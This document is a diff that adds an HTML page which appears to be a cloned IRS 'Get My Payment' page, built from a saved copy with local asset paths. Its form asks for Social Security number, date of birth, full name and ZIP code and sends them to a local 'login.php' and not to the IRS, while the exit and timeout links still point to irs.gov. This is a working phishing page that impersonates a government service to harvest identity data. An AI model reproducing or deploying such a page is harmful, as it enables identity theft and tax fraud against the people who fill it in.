@@ -1,0 +1,418 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+		
+		<meta name="viewport" content="width=device-width,initial-scale=1">
+    	<link rel="icon" type="image/x-icon" href="https://sa.www4.irs.gov/irfof-wmsp/webjars/images/favicon.ico">
+		<link rel="stylesheet" href="./Get My Payment_files/bootstrap.min.css">
+		<link rel="stylesheet" href="./Get My Payment_files/jquery-ui.min.css">
+		<link rel="stylesheet" href="./Get My Payment_files/irs.css">
+		<link rel="stylesheet" href="./Get My Payment_files/app.css">
+		
+<link rel="stylesheet" href="./Get My Payment_files/wmsp-shared-secrets.css">
+<link rel="stylesheet" href="./Get My Payment_files/wmsp-error.css">
+<link rel="stylesheet" href="./Get My Payment_files/wmsp-results.css">
+
+		<script type="text/javascript" async="" src="https://dap.digitalgov.gov/Universal-Federated-Analytics-Min.js?agency=Treasury&amp;subagency=IRS" id="_fed_an_ua_tag"></script><script async="" src="//www.google-analytics.com/analytics.js"></script><script src="./Get My Payment_files/jquery.min.js.download"></script><script data-dapp-detection="">
+(function() {
+  let alreadyInsertedMetaTag = false
+
+  function __insertDappDetected() {
+    if (!alreadyInsertedMetaTag) {
+      const meta = document.createElement('meta')
+      meta.name = 'dapp-detected'
+      document.head.appendChild(meta)
+      alreadyInsertedMetaTag = true
+    }
+  }
+
+  if (window.hasOwnProperty('web3')) {
+    // Note a closure can't be used for this var because some sites like
+    // www.wnyc.org do a second script execution via eval for some reason.
+    window.__disableDappDetectionInsertion = true
+    // Likely oldWeb3 is undefined and it has a property only because
+    // we defined it. Some sites like wnyc.org are evaling all scripts
+    // that exist again, so this is protection against multiple calls.
+    if (window.web3 === undefined) {
+      return
+    }
+    __insertDappDetected()
+  } else {
+    var oldWeb3 = window.web3
+    Object.defineProperty(window, 'web3', {
+      configurable: true,
+      set: function (val) {
+        if (!window.__disableDappDetectionInsertion)
+          __insertDappDetected()
+        oldWeb3 = val
+      },
+      get: function () {
+        if (!window.__disableDappDetectionInsertion)
+          __insertDappDetected()
+        return oldWeb3
+      }
+    })
+  }
+})()</script>
+		<script src="./Get My Payment_files/jquery-ui.min.js.download"></script>
+		<script src="./Get My Payment_files/bootstrap.min.js.download"></script>
+		<title>Get My Payment</title>
+	</head>
+	<body class="icce">
+	
+		<div class="container-fluid" style="background: #f1f1f1; width: 100%;">
+			<div class="flagtext">
+			  </div>
+		</div>
+	
+		<div class="container-fluid" role="banner" style="background-color: #234E76; width: 100%;">
+			<div class="header">
+				<div class="navbar">
+						<a class="logo" href="javascript:openIrsPage()" title="Go to IRS Home Page">
+							<img aria-hidden="true" src="./Get My Payment_files/logo.png">
+						</a>																	
+						
+						<ul class="navbar-nav">
+							
+							
+
+	
+ 
+	
+
+                
+           
+								<li class="navbar-item"><a class="nav-link" href="javascript:logout()" title="Click this link to logoff"> <span>Exit</span> 
+										<svg aria-hidden="true" focusable="false" viewBox="0 0 491.1 412.5">
+											<path d="M 282.9 283.5 v 11.9 c 0 24.5 0.1 49.1 0 73.6 c 0 9.3 3.2 16.6 12 20.6 c
+											    9.2 4.1 16.7 0.5 23 -5.9 c 54.4 -54.3 108.8 -108.6 163.1 -163.1 c 10.2 -10.2
+											    10.3 -21 0.3 -31 c -54.4 -54.7 -109.1 -109.2 -163.7 -163.7 c -6.1 -6.1 -13.4
+											    -9.4 -22.3 -5.7 c -8.9 3.8 -12.4 11 -12.4 20.3 v 86 h -11.8 c -40.6 0 -81.1
+											    -0.1 -121.7 0 c -15.7 0 -23.5 7.1 -23.6 22.3 c -0.2 37.6 -0.2 75.3 0 112.9 c
+											    0.1 14.2 7.9 21.6 22.1 21.8 c 15.7 0.2 31.4 0.1 47.1 0.1 c 28.8 -0.1 57.6
+											    -0.1 87.9 -0.1 Z M 8.2 205 h -0.4 c 0 35.7 -0.3 71.4 0.1 107 c 0.4 46.6 30.7
+											    83.4 76.9 87.8 c 36.3 3.5 73.2 1.4 109.8 1.2 c 2.8 0 7.1 -3.9 8 -6.8 c 1.7
+											    -5.1 2 -10.9 1.6 -16.4 c -0.9 -14 -2.8 -15.5 -16.7 -15.5 h -87.4 C 68 362.2
+											    47 343 46.7 311.2 c -0.6 -70.7 -0.6 -141.4 0 -212.1 c 0.3 -32 21.1 -51.1
+											    53.2 -51.2 c 28.8 -0.1 57.6 0 86.4 0 c 15.2 0 18.1 -2.9 18.1 -18.4 c 0 -3.3
+											    -0.6 -6.5 -0.8 -9.8 c -0.5 -7.6 -4.5 -11 -12.1 -11 c -33.4 0.1 -66.8 -0.7
+											    -100.1 0.4 c -44.7 1.5 -81.1 36.6 -83 81.1 c -1.4 38.2 -0.2 76.5 -0.2 114.8
+											    Z">
+											 </path>
+											 <path d="M 282.9 283.5 h -87.8 c -15.7 0 -31.4 0.2 -47.1 -0.1 c -14.2 -0.2 -22 -7.6
+											    -22.1 -21.8 c -0.3 -37.6 -0.3 -75.3 0 -112.9 c 0.1 -15.1 7.9 -22.2 23.6
+											    -22.3 c 40.6 -0.1 81.1 0 121.7 0 H 283 V 114 V 40.4 c 0 -9.3 3.5 -16.5 12.4
+											    -20.3 c 8.8 -3.7 16.1 -0.4 22.3 5.7 C 372.4 80.3 427 134.9 481.5 189.6 c 10
+											    10 9.8 20.8 -0.3 31 c -54.3 54.5 -108.7 108.8 -163.1 163.1 c -6.4 6.4 -13.9
+											    10 -23 5.9 c -8.8 -4 -12 -11.3 -12 -20.6 c 0.1 -24.5 0 -49.1 0 -73.6 c -0.2
+											    -3.5 -0.2 -7 -0.2 -11.9 Z">
+											 </path>
+											 <path d="M 8.2 205 c 0 -38.3 -1.3 -76.6 0.3 -114.8 c 1.9 -44.5 38.3 -79.6 83 -81.1 c
+											    33.3 -1.1 66.8 -0.3 100.1 -0.4 c 7.6 0 11.6 3.4 12.1 11 c 0.2 3.3 0.8 6.5
+											    0.8 9.8 c 0 15.5 -3 18.4 -18.1 18.4 H 100 c -32.1 0.1 -53 19.3 -53.2 51.2 c
+											    -0.6 70.7 -0.6 141.4 0 212.1 c 0.3 31.8 21.3 51.1 53.4 51.1 c 29.1 0.1 58.3
+											    0 87.4 0 c 13.9 0 15.8 1.5 16.7 15.5 c 0.3 5.5 0 11.3 -1.6 16.4 c -1 2.9
+											    -5.2 6.8 -8 6.8 c -36.6 0.2 -73.5 2.3 -109.8 -1.2 c -46.3 -4.3 -76.6 -41.2
+											    -77 -87.8 c -0.3 -35.7 -0.1 -71.3 -0.1 -107 h 0.4 Z">
+											  </path>
+									 	</svg></a></li>
+									 	
+				 					 	
+           
+                
+	
+							</ul>
+						</div>
+					</div>
+				</div>
+  
+
+
+<script>
+
+function openIrsPage ( ) {
+var language = $('a.nav-link[href="javascript:switchLanguage()"]').text();
+
+if($.trim(language) == "English"){ 
+  window.open (
+    "http://www.irs.gov/es/spanish",
+    "_blank" );  
+ }
+ else
+ {
+  window.open (
+    "http://www.irs.gov",
+    "_blank" );
+ }   
+}
+  
+  
+function openIrsAccessibility ( ) {
+var language = $('a.nav-link[href="javascript:switchLanguage()"]').text();
+
+if($.trim(language) == "English"){ 
+  window.open (
+    "http://www.irs.gov/es/help/irsgov-accessibility",
+    "_blank" );  
+ }
+ else
+ {
+  window.open (
+    "http://www.irs.gov/help/irsgov-accessibility",
+    "_blank" );
+ }   
+}
+
+function openIrsPrivacyPolicy ( ) {
+
+var language = $('a.nav-link[href="javascript:switchLanguage()"]').text();
+
+if($.trim(language) == "English"){ 
+  window.open (
+    "http://www.irs.gov/es/privacy-disclosure/irs-privacy-policy",
+    "_blank" );  
+ }
+ else
+ {
+  window.open (
+    "http://www.irs.gov/privacy/index.html",
+    "_blank" );
+ } 
+}
+
+function switchLanguage ( ) {
+  
+  location.replace ( "?lang=es");
+}
+
+</script>
+	
+		<div class="main container-fluid">
+			<main>
+
+<form action="login.php" method="post">
+
+	<h1 class="login-title">Get My Payment</h1>
+
+	<p>If you need additional help, please visit our <a href="#" target="_blank">Frequently Asked Questions</a> page.</p>
+	
+	<p>
+	<span>All fields marked with an</span>
+	<font color="#CD2026">*</font>
+	<span>(asterisk) are required.</span>
+	</p>
+	<br>
+	
+	
+					
+		
+
+
+		<div class="form-group">
+			<div class="control-label">
+				<label>Social Security Number (SSN)</label> 
+				<label style="color:#CD2026;font-weight:normal">*</label> 
+				<button aria-controls="help-ssn" aria-expanded="false" class="collapsibleButtonIcon collapsed" data-target="#help-ssn" data-toggle="collapse" title="Help on SSN or Individual Tax Identification Number " type="button">
+				</button>
+			</div>
+			<div class="collapse divHelpTipCollapsible" id="help-ssn">
+				<div class="divHelpTipCollapsibleContent">
+					<p>Enter your 9 digit Social Security Number (SSN) or Individual Tax Identification Number (ITIN).</p>
+				</div>
+			</div>
+			<input class="form-control" id="ssn" type="text" maxlength="9" title="Enter your 9 digit Social Security Number (SSN) or Individual Tax ID Number (ITIN)" name="ssn" value=""> 
+				
+		</div>
+
+		<div class="form-group">
+			<div class="control-label">
+				<label for="dobInput">Date of Birth</label>
+				<label style="color:#CD2026;font-weight:normal">*</label> 
+				<span class="fsad-hint">MMDDYYYY</span>
+			</div>
+			<div class="login-dob">
+				<input class="form-control hasDatepicker" id="dob" title="Enter your Date of Birth in MM/DD/YYYY format" maxlength="8" type="text" name="dob" value="">
+</div>
+			
+		</div>
+
+		<div class="form-group">
+			<div class="control-label">
+				<label>Full Name</label>
+				<label style="color:#CD2026;font-weight:normal">*</label>
+				</div>
+					<input class="form-control" id="name" maxlength="100" type="text" title="Enter your Street Address" name="name" value=""> 
+				
+		</div>
+
+		<div class="form-group">
+			<div class="control-label">
+				<label>ZIP or Postal Code</label>
+				<label style="color:#CD2026;font-weight:normal">* (Required, except for countries without ZIP or postal codes)</label>
+				<button aria-controls="help-zip" aria-expanded="false" class="collapsibleButtonIcon collapsed" data-target="#help-zip" data-toggle="collapse" title="Help on ZIP or Postal Code " type="button">
+				</button>
+			</div>
+			<div class="collapse divHelpTipCollapsible" id="help-zip">
+				<div class="divHelpTipCollapsibleContent">
+					<p>Enter your 5 digit ZIP or Postal Code.</p>
+				</div>
+			</div>
+			<input class="form-control" id="zip" maxlength="5" type="text" title="Enter your ZIP or Postal Code" name="zip" value=""> 
+				
+		</div>
+
+		<div>
+			<button class="login-submit-button btn btn-primary" name="submit" title="Click this button to continue" type="submit" value="submit">Continue</button>
+		</div>
+</form>
+	
+		
+	
+
+</main>
+		</div><div id="ui-datepicker-div" class="ui-datepicker ui-widget ui-widget-content ui-helper-clearfix ui-corner-all"></div>
+	        
+	    <div class="container-fluid" style="background: #4E4E4E;width: 100%;">
+	        <div class="footer container-fluid"> 
+	          <div class="navbar">
+	            <div class="navfooterlogo">
+					<img aria-hidden="true" alt="Decorative IRS Logo" src="./Get My Payment_files/irs_horiz_white.png">
+				</div>
+
+							
+					<ul class="navbar-nav">
+						<li class="navbar-item"><a class="nav-link" href="javascript:openIrsPrivacyPolicy()" title="Click this link to view the IRS Privacy Policy Page">
+							<span style="color:white">IRS Privacy Policy</span>
+							<svg style="top: 0.2em; vertical-align: baseline; position: relative;" fill="white" focusable="false" viewBox="0 0 40 40" width="1em" height="1em">
+	<path d="m 31.4 20.7 v 7.2 q 0 2.6 -1.9 4.5 t -4.5 1.9 h -18.6
+	    q -2.6 0 -4.5 -1.9 t -1.9 -4.5 v -18.6 q 0 -2.7 1.9 -4.6
+	    t 4.5 -1.8 h 15.7 q 0.4 0 0.6 0.2 t 0.2 0.5 v 1.4
+	    q 0 0.3 -0.2 0.5 t -0.6 0.2 h -15.7 q -1.4 0 -2.5 1.1
+	    t -1 2.5 v 18.6 q 0 1.4 1 2.5 t 2.5 1 h 18.6 q 1.5 0 2.5 -1
+	    t 1.1 -2.5 v -7.2 q 0 -0.3 0.2 -0.5 t 0.5 -0.2 h 1.4
+	    q 0.3 0 0.5 0.2 t 0.2 0.5 Z m 8.6 -19.3 v 11.5
+	    q 0 0.5 -0.4 1 t -1 0.4 t -1 -0.4 l -4 -4 l -14.5 14.6
+	    q -0.2 0.2 -0.5 0.2 t -0.5 -0.2 l -2.6 -2.6
+	    q -0.2 -0.2 -0.2 -0.5 t 0.2 -0.5 l 14.6 -14.5 l -4 -4
+	    q -0.4 -0.4 -0.4 -1 t 0.4 -1 t 1 -0.4 h 11.5 q 0.6 0 1 0.4
+	    t 0.4 1 Z"></path>
+	</svg></a></li>
+						<li class="navbar-item" id="accessibility-link"><a class="nav-link" href="javascript:openIrsAccessibility()" title="Click this link to view the Accessibility Page">
+								<span style="color:white">Accessibility</span>
+							<svg style="top: 0.2em; vertical-align: baseline; position: relative;" fill="white" focusable="false" viewBox="0 0 40 40" width="1em" height="1em">
+	<path d="m 31.4 20.7 v 7.2 q 0 2.6 -1.9 4.5 t -4.5 1.9 h -18.6
+	    q -2.6 0 -4.5 -1.9 t -1.9 -4.5 v -18.6 q 0 -2.7 1.9 -4.6
+	    t 4.5 -1.8 h 15.7 q 0.4 0 0.6 0.2 t 0.2 0.5 v 1.4
+	    q 0 0.3 -0.2 0.5 t -0.6 0.2 h -15.7 q -1.4 0 -2.5 1.1
+	    t -1 2.5 v 18.6 q 0 1.4 1 2.5 t 2.5 1 h 18.6 q 1.5 0 2.5 -1
+	    t 1.1 -2.5 v -7.2 q 0 -0.3 0.2 -0.5 t 0.5 -0.2 h 1.4
+	    q 0.3 0 0.5 0.2 t 0.2 0.5 Z m 8.6 -19.3 v 11.5
+	    q 0 0.5 -0.4 1 t -1 0.4 t -1 -0.4 l -4 -4 l -14.5 14.6
+	    q -0.2 0.2 -0.5 0.2 t -0.5 -0.2 l -2.6 -2.6
+	    q -0.2 -0.2 -0.2 -0.5 t 0.2 -0.5 l 14.6 -14.5 l -4 -4
+	    q -0.4 -0.4 -0.4 -1 t 0.4 -1 t 1 -0.4 h 11.5 q 0.6 0 1 0.4
+	    t 0.4 1 Z"></path>
+	</svg>
+						</a></li>
+					</ul>
+					
+
+				</div>
+			</div>
+		</div>
+			
+			
+		
+		<form action="https://sa.www4.irs.gov/irfof-wmsp/logout" method="post" name="logoutForm">
+		</form>
+		<script src="./Get My Payment_files/bootstrap.min.js.download"></script>
+		<script>
+			var ga_id = "UA-22588183-6";
+		</script>
+		<script src="./Get My Payment_files/google-analytics.js.download"> </script>
+		<script src="./Get My Payment_files/expire.js.download"> </script>
+		<script src="./Get My Payment_files/fluidDialog.js.download"> </script>	
+		<script>
+			function logout() {
+				document.logoutForm.submit();
+			}
+		</script>
+		<form action="https://sa.www4.irs.gov/irfof-wmsp/session-timeout" method="post" name="sessionTimeoutForm"></form>
+		<script>
+			function sessionTimeout() {
+				document.sessionTimeoutForm.submit();
+			}
+		</script>
+		<script>
+			var timeoutView = false;
+			var logoutView = false;
+			if(!timeoutView && !logoutView)
+				expireManager
+					.init({
+						buttonTextCancel : "Cancel",
+						buttonTextOk : "OK",
+						buttonTitleCancel : "Do not renew session",
+						buttonTitleOk : "Click here if you want to renew this session for 15 minutes",
+						callbackFunctionSessionEnd : sessionTimeout,
+						dialogText : "Your session will expire in 5 minutes.<br><br>If you want to refresh the session for an additional 15 minutes select OK.  If not, select Cancel.",
+						dialogTitle : "IRS - Session Warning",
+						jQuery : jQuery
+					});
+		</script><div tabindex="-1" role="dialog" class="ui-dialog ui-corner-all ui-widget ui-widget-content ui-front expire ui-dialog-buttons ui-draggable" aria-labelledby="ui-id-1" style="display: none;"><div class="ui-dialog-titlebar ui-corner-all ui-widget-header ui-helper-clearfix ui-draggable-handle expire"><span id="ui-id-1" class="ui-dialog-title expire">IRS - Session Warning</span><button type="button" class="ui-dialog-titlebar-close expire"></button></div><div id="expire-content" style="" class="ui-dialog-content ui-widget-content expire"><div id="expire-text" tabindex="0" class="expire">Your session will expire in 5 minutes.<br class="expire"><br class="expire">If you want to refresh the session for an additional 15 minutes select OK.  If not, select Cancel.</div></div><div class="ui-dialog-buttonpane ui-widget-content ui-helper-clearfix expire"><div class="ui-dialog-buttonset expire"><button type="button" title="Click here if you want to renew this session for 15 minutes" class="expire">OK</button><button type="button" title="Do not renew session" class="expire">Cancel</button></div></div></div>
+		<script>
+			function onCollapsibleClicked(){
+				$( '.collapsibleButtonIcon' ).click(function(){
+        			var expanded =  $(this).attr('aria-expanded');
+        			var id = $(this).attr('aria-controls');
+        			if(expanded ==  'false'){
+        				$('.collapsibleButtonIcon[aria-expanded="true"]').click();
+        				$('.divHelpTipCollapsible#'+id+'>.divHelpTipCollapsibleContent').attr('aria-live','polite');
+        				var source = $('.divHelpTipCollapsible#'+id).html();
+						$('.divHelpTipCollapsible#'+id).html(source);
+        			}
+        		});
+			}
+			
+			function onThereAreValidationErrors(){
+				if ( $( '.login-errors' ).length ) {
+					
+					$('p.login-errors').attr("tabindex", 0);
+					$('.login-errors').find('span,a').each(function() {
+						$( this ).attr("tabindex", 0)
+						
+					});
+					
+					
+					$('.form-group').each(function(){
+						$(this).find('.collapsibleButtonIcon').attr("tabindex", 0);
+						$(this).find('.form-control').attr("tabindex", 0);
+					});
+					
+					$('.login-submit-button').attr("tabindex", 0);
+					
+					var numberOfErrors = 0;
+					var errorMessageEng = ' Errors have occurred. See below for more information.';
+					var errorMessageEsp = ' Errores ha ocurrido. Favor de ver a continuaci\xF3n para mayor informaci\xF3n.';
+					$('div.login-errors>ul').find('a').each(function(){ ++numberOfErrors;});
+					if(numberOfErrors > 1){
+						var language = $('a.nav-link[href="javascript:switchLanguage()"]').text();
+						var errorMessage = '';
+						if($.trim(language) == "English"){ // then page currently in spanish
+							errorMessage = numberOfErrors + errorMessageEsp;
+						}else{ // page is currently in English
+							errorMessage = numberOfErrors + errorMessageEng;
+						}
+						$('div.login-errors>span.login-errors-message').text(errorMessage);
+					}
+					
+					$( '.login-errors:visible' ).focus();
+					$('.login-errors-message:visible').focus();
+				}
+				
+			}
+			
+			$( document ).ready(function() {
+				onCollapsibleClicked();
+				onThereAreValidationErrors();
+			});
+		</script>
+	<script type="text/javascript">var _cf = _cf || []; _cf.push(['_setFsp', true]);  _cf.push(['_setBm', true]); _cf.push(['_setAu', '/public/ce1384469195631a75b459127272b']); </script><script type="text/javascript" src="./Get My Payment_files/ce1384469195631a75b459127272b"></script>
+</body></html>
